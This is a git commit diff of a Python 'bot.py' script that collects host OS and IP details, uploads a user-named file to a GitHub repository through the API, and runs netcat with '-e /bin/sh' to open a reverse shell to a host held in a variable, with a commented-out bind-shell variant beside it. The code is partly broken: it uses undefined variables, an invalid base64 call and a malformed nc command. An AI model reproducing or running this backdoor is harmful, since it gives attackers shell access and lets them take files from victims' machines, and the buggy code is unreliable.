045418ca7203db98938f6b0648103484114b7f6a
kaki714 <123768052+kaki714@users.noreply.github.com>
2023-02-14 14:17:58 -0500

    Update bot.py

--- bot.py
+++ bot.py
@@ -5,19 +5,20 @@ import socket
 
 
 
-def upload_file_to_github(file_path, repository, branch, token):
+
+def upload_file_to_github(file_path):
     with open(file_path, 'rb') as f:
         file_content = f.read()
+    # Codificar la imagen en base64
+    file_content = file_content.encode('base64')
 
     # Construir la URL de la API de GitHub
-    url = f"https://api.github.com/repos/{repository}/contents/{file_path}?ref={branch}"
-
+    url = f"https://api.github.com/repos/Not/contents/{file_path}"
     # Establecer la autorización
     headers = {
         "Authorization": f"Token {token}",
         "Accept": "application/vnd.github+json"
     }
-
     # Enviar la solicitud para obtener la información del archivo actual
     response = requests.get(url, headers=headers)
     if response.status_code == 200:
@@ -26,11 +27,10 @@ def upload_file_to_github(file_path, repository, branch, token):
         sha = file_info['sha']
     else:
         sha = None
-
     # Crear la solicitud para actualizar el archivo
     data = {
         "message": "Uploading file",
-        "content": file_content.decode('utf-8'),
+        "content": file_content,
         "sha": sha,
         "branch": branch
     }
@@ -43,8 +43,6 @@ def upload_file_to_github(file_path, repository, branch, token):
         print(f"Failed to upload file: {response.content}")
 
 # Ejemplo de uso
-#upload_file_to_github('example.txt', 'your-username/your-repository', 'main', 'your-token')
-
 
 
 
@@ -65,8 +63,11 @@ def run():
     print('')
     print('# OS name: ', platform.system())
     if "Linux" in platform.system():
-        print('Linux: ', sysconfig.get_platform()) 
+        print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
         print(' IpAddress: ', IPAddr)
+        print('insert Filename to upload: ')
+        archive=input()
+        upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
         os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
